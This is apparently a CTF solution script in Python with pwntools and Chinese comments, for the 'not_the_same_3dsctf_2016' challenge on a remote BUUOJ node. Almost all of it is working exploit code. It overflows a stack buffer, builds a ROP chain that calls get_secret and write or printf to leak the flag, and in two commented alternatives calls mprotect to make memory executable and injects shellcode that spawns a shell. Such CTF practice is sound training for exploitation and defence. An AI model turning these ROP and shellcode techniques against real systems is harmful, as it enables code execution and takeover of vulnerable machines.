from pwn import *

r = remote('node5.buuoj.cn', 25748)

getflag_addr = 0x80489A0
fl4g_addr = 0x80ECA2D
write_addr = 0x806E270
main_addr = 0x80489E0
printf_addr = 0x804F0A0
exit_addr = 0x0804e660

# 没有push操作，不用覆盖ebp
# 写调用get_secret()函数将flag写入fl4g变量，再将返回地址设为write输出fl4g变量
payload = b'A' * 0x2D + p32(getflag_addr) + p32(write_addr) + p32(main_addr) + p32(1) + p32(fl4g_addr) + p32(50)
# 或者使用printf函数输出
# payload = b'A' * 0x2D + p32(getflag_addr) + p32(printf_addr) + p32(exit_addr) + p32(fl4g_addr)
r.sendline(payload)
r.interactive()

'''
# 方法2：mprotect修改内存权限，再写入shellcode执行
from pwn import *
r = process(r'./not_the_same_3dsctf_2016')
context.log_level = 'debug'
mprotect_addr = 0x806ED40
buf_start_add = 0x80eb000
buf_size = 0x1000
buf_premit = 0x7
read_addr = 0x806E200
# 0x08063b9b : pop edi ; pop esi ; pop ebx ; ret
pop_edi_esi_ebx = 0x08063b9b


payload = b'A' * 0x2D + p32(mprotect_addr) + p32(pop_edi_esi_ebx) + p32(buf_start_add) + p32(buf_size) + p32(buf_premit)
payload += p32(read_addr) + p32(pop_edi_esi_ebx) + p32(0) + p32(buf_start_add) + p32(0x600) + p32(buf_start_add)
r.sendline(payload)

shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux')

r.sendline(shellcode)
r.interactive()
'''



'''
# 方法3：mprotect函数修改内存权限，写入shellcode执行命令 （不使用pop寄存器，控制执行流程返回main函数引发第二次溢出）
from pwn import *
r = process(r'./not_the_same_3dsctf_2016')
context.log_level = 'debug'
mprotect_addr = 0x806ED40
buf_start_add = 0x80eb000
buf_size = 0x1000
buf_premit = 0x7
read_addr = 0x806E200
main_addr = 0x80489E0

#gdb.attach(r)

# 使用mprotect函数修改完内存之后，再返回main函数引发第二次溢出
payload = b'A' * 0x2D + p32(mprotect_addr) + p32(main_addr) + p32(buf_start_add) + p32(buf_size) + p32(buf_premit)
r.sendline(payload)
# 第二次溢出使用read函数向目标内存地址写入shellcode
payload2 = b'A' * 0x2D + p32(read_addr) + p32(buf_start_add) + p32(0) + p32(buf_start_add) + p32(0x600)
r.sendline(payload2)
# 因为刚刚调用了read函数等待输入，这里输入shellcode
shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux')
r.sendline(shellcode)
r.interactive()

'''